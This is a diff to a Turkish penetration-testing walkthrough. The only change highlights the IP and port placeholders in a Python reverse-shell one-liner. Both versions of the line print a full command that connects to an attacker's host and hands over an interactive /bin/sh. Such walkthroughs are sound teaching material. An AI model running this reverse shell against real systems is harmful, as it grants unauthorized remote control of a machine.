@@ -96,7 +96,7 @@ Makinede Python olup olmadığı kontrol edildikten sonra Python ile komut çal�
 
 ``` locate python ```
 <br>
-``` python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Makine IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
+``` python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span style="background-color: yellow;"><Makine IP>",<PORT></span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
 <br>
     <div style="text-align:center;">
     <img src="images/9-reversehellcode.png" alt="3" width="500" >
